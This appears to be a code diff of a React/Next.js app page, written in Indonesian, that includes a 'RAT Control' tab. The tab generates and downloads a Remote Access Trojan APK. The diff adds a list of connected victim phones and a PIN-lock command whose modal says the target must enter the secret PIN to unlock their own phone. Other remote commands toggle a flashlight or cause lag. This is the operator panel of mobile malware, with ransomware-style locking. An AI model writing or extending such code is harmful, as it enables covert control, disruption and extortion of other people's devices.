@@ -1,16 +1,16 @@
 "use client";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { io } from "socket.io-client";
 import { 
-  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff, ArrowRight, 
-  MessageSquare, Bell, Plus, Heart, Wrench, DownloadCloud, 
+  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff, 
+  MessageSquare, Plus, Wrench, DownloadCloud, 
   Search, Bug, Send, X, ChevronLeft, ShieldAlert, Globe, 
   FileText, Play, Pause, Gamepad2, Music, CheckCircle2, 
-  Dices, Bot, Grid3X3, Crown, CircleDollarSign, Users, 
-  Puzzle, Globe2, Loader2, LogOut, Settings, Camera,
-  Clock, Shield, Phone, Terminal, Link, Mail, MapPin, 
+  Dices, Grid3X3, Crown, CircleDollarSign, Users, 
+  Loader2, LogOut, Settings, Camera,
+  Clock, Shield, Phone, Link, Mail, MapPin, 
   CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
-  PlayCircle, Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle
+  Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle
 } from "lucide-react";
 
 import { GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe } from "./gameEngine";
@@ -112,7 +112,6 @@ export default function Home() {
   const [currentSong, setCurrentSong] = useState(null);
   const [isPlaying, setIsPlaying] = useState(false);
 
-  // RAT STATE
   const [ratTargetId, setRatTargetId] = useState("");
   const [ratStates, setRatStates] = useState({
     flashlight: false,
@@ -121,19 +120,20 @@ export default function Home() {
     lag: false
   });
   const [ratLoading, setRatLoading] = useState(false);
-  
-  // STATE BARU UNTUK RAT MULTI-USER
   const [ratSocket, setRatSocket] = useState(null);
   const [isGenerating, setIsGenerating] = useState(false);
+  const [onlineDevices, setOnlineDevices] = useState([]);
 
-  // FUNGSI DOWNLOAD APK (GENERATE)
+  const [showPinModal, setShowPinModal] = useState(false);
+  const [lockPin, setLockPin] = useState("");
+
   const handleGenerateAPK = async () => {
     setIsGenerating(true);
     try {
       const response = await fetch(`${API_URL}/generate-apk`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ownerId: username }) // Gunakan username sebagai Owner ID
+        body: JSON.stringify({ ownerId: username })
       });
 
       if (!response.ok) throw new Error("Gagal download");
@@ -153,10 +153,14 @@ export default function Home() {
     }
   };
 
-  // FUNGSI KENDALI RAT (SOCKET.IO)
-  const toggleRat = async (key) => {
-    if (!ratTargetId) return alert("Masukkan Device ID target dulu bre!");
+  const toggleRat = async (key, pin = null) => {
+    if (!ratTargetId) return alert("Pilih target dulu bre!");
     if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung ke server!");
+
+    if (key === 'lock' && !ratStates.lock && !pin) {
+      setShowPinModal(true);
+      return;
+    }
 
     const newState = !ratStates[key];
     setRatStates(prev => ({ ...prev, [key]: newState }));
@@ -172,10 +176,17 @@ export default function Home() {
     ratSocket.emit("rat_command", {
       deviceId: ratTargetId,
       command: command,
-      ownerId: username // <--- PENTING: Kirim username sebagai identitas
+      ownerId: username,
+      pin: pin
     });
 
     setTimeout(() => setRatLoading(false), 1000);
+  };
+
+  const submitLock = () => {
+    if (lockPin.length < 4) return alert("PIN minimal 4 angka!");
+    setShowPinModal(false);
+    toggleRat('lock', lockPin);
   };
 
   const startBGM = () => {
@@ -267,7 +278,6 @@ export default function Home() {
 
   useEffect(() => {
     if (isLoggedIn && !showIntro) {
-      // Socket buat Chat
       const newSocket = io(API_URL);
       setSocket(newSocket);
       newSocket.emit('user_online', username);
@@ -275,9 +285,13 @@ export default function Home() {
       newSocket.on('receive_global_msg', (data) => setGlobalMsgs((prev) => [...prev, data]));
       newSocket.on('receive_private_msg', (data) => setPrivateMsgs((prev) => [...prev, data]));
       
-      // Socket buat RAT
       const s = io(API_URL, { transports: ["websocket"] });
       setRatSocket(s);
+
+      s.on("rat_update_devices", (devices) => {
+        const myDevices = devices.filter(d => d.ownerId === username);
+        setOnlineDevices(myDevices);
+      });
 
       return () => {
         newSocket.close();
@@ -480,7 +494,6 @@ export default function Home() {
   };
 
 
-  // --- RENDERS ---
   if (showIntro) {
     return (
       <div className="min-h-screen bg-black relative flex items-center justify-center">
@@ -523,7 +536,6 @@ export default function Home() {
     );
   }
 
-  // --- HALAMAN TOOLS ---
   if (activeTool) {
     return (
       <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans pb-24">
@@ -535,7 +547,6 @@ export default function Home() {
         </header>
 
         <main className="px-4 max-w-md mx-auto mt-2 space-y-4">
-          {/* HEADER JAM */}
           <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 relative overflow-hidden shadow-2xl">
             <div className="absolute top-0 right-0 w-32 h-32 bg-zinc-600/20 blur-3xl rounded-full"></div>
             <div className="flex justify-between items-start">
@@ -554,7 +565,6 @@ export default function Home() {
             </div>
           </div>
 
-          {/* 3 TOMBOL BARIS */}
           <div className="grid grid-cols-3 gap-2">
             <button onClick={() => { setChatMode("global"); setActiveTab("chat"); setActiveTool(null); }} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20">
               <MessageSquare size={20} className="text-white" />
@@ -570,7 +580,6 @@ export default function Home() {
             </a>
           </div>
 
-          {/* KOTAK INFO FUNGSI */}
           <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
             <h3 className="text-white font-bold text-sm mb-2 flex items-center gap-2">
               <activeTool.icon size={16} className={activeTool.color} /> Info Fitur
@@ -580,7 +589,6 @@ export default function Home() {
             </p>
           </div>
 
-          {/* INPUT & EKSEKUSI */}
           <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
             <label className="text-xs text-zinc-400 block mb-2">Target / Input</label>
             <input 
@@ -601,7 +609,6 @@ export default function Home() {
     );
   }
 
-  // --- HALAMAN UTAMA (HOME) ---
   const renderSidebar = () => (
     <>
       <div className={`fixed inset-0 bg-black/60 z-40 transition-opacity ${isSidebarOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} onClick={() => setIsSidebarOpen(false)} />
@@ -675,10 +682,38 @@ export default function Home() {
     );
   };
 
+  const renderPinModal = () => {
+    if (!showPinModal) return null;
+    return (
+      <div className="fixed inset-0 bg-black/80 z-[999] flex items-center justify-center p-4">
+        <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl w-full max-w-sm p-6 relative">
+          <button onClick={() => setShowPinModal(false)} className="absolute top-4 right-4 text-zinc-400"><X size={20}/></button>
+          <h2 className="text-white font-bold text-lg mb-2">Kunci HP Target</h2>
+          <p className="text-xs text-zinc-400 mb-4">Masukkan PIN rahasia. Target harus memasukkan PIN ini untuk membuka HP mereka.</p>
+          <div className="space-y-4">
+            <div>
+              <label className="text-xs text-zinc-400 block mb-1">PIN Rahasia</label>
+              <input 
+                type="text" 
+                value={lockPin} 
+                onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))} 
+                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest" 
+                placeholder="Contoh: 123456" 
+                maxLength={8}
+              />
+            </div>
+            <button onClick={submitLock} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex justify-center items-center transition-colors">
+              <Lock size={20} className="mr-2" /> Kunci Sekarang!
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  };
+
   return (
     <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans pb-24">
       
-      {/* OVERLAY FINGERPRINT */}
       {showTapToPlay && (
         <div 
           onClick={handleFingerprintTap} 
@@ -719,6 +754,7 @@ export default function Home() {
       {renderSidebar()}
       {renderProfileModal()}
       {renderSenderModal()}
+      {renderPinModal()}
 
       {activeGame === 'catur' && <GameCatur level="medium" onClose={() => setActiveGame(null)} />}
       {activeGame === 'uno' && <GameUno onClose={() => setActiveGame(null)} />}
@@ -938,7 +974,6 @@ export default function Home() {
           </div>
         )}
 
-        {/* HALAMAN RAT (TERHUBUNG SOCKET.IO) */}
         {activeTab === "rat" && (
           <div className="space-y-4">
             <h2 className="text-white font-bold text-xl mb-4">RAT Control</h2>
@@ -949,7 +984,6 @@ export default function Home() {
               </video>
             </div>
 
-            {/* TOMBOL GENERATE APK */}
             <button 
               onClick={handleGenerateAPK} 
               disabled={isGenerating}
@@ -959,19 +993,38 @@ export default function Home() {
               {isGenerating ? "Merakit APK..." : "Generate & Download APK RAT"}
             </button>
 
-            {/* INPUT DEVICE ID */}
             <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mb-4">
-              <label className="text-xs text-zinc-400 block mb-2">Device ID Target</label>
-              <input 
-                type="text" 
-                value={ratTargetId} 
-                onChange={(e) => setRatTargetId(e.target.value)} 
-                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white" 
-                placeholder="Masukkan ID Device" 
-              />
+              <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2">
+                <Smartphone size={16} className="text-green-500" /> 
+                Target Terhubung ({onlineDevices.length})
+              </h3>
+              {onlineDevices.length === 0 ? (
+                <p className="text-xs text-zinc-500 text-center py-2">Belum ada HP target yang terhubung.</p>
+              ) : (
+                <div className="space-y-2 max-h-40 overflow-y-auto">
+                  {onlineDevices.map((device) => (
+                    <div 
+                      key={device.deviceId} 
+                      onClick={() => setRatTargetId(device.deviceId)} 
+                      className={`p-3 rounded-lg border cursor-pointer transition-all flex justify-between items-center ${
+                        ratTargetId === device.deviceId 
+                          ? 'bg-green-900/30 border-green-500' 
+                          : 'bg-black/40 border-zinc-700 hover:border-zinc-500'
+                      }`}
+                    >
+                      <div>
+                        <p className="text-xs text-white font-bold">{device.deviceName}</p>
+                        <p className="text-[10px] text-zinc-500 font-mono">{device.deviceId}</p>
+                      </div>
+                      {ratTargetId === device.deviceId && (
+                        <CheckCircle2 size={16} className="text-green-500" />
+                      )}
+                    </div>
+                  ))}
+                </div>
+              )}
             </div>
 
-            {/* SWITCHES */}
             <div className="space-y-3">
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
                 <div className="flex items-center gap-3">
@@ -1037,7 +1090,6 @@ export default function Home() {
         )}
       </main>
 
-      {/* BOTTOM NAVBAR */}
       <div className="fixed bottom-0 w-full bg-[#1c1c1e] border-t border-zinc-700 p-2 z-30">
         <div className="flex justify-around items-center px-2">
            {[
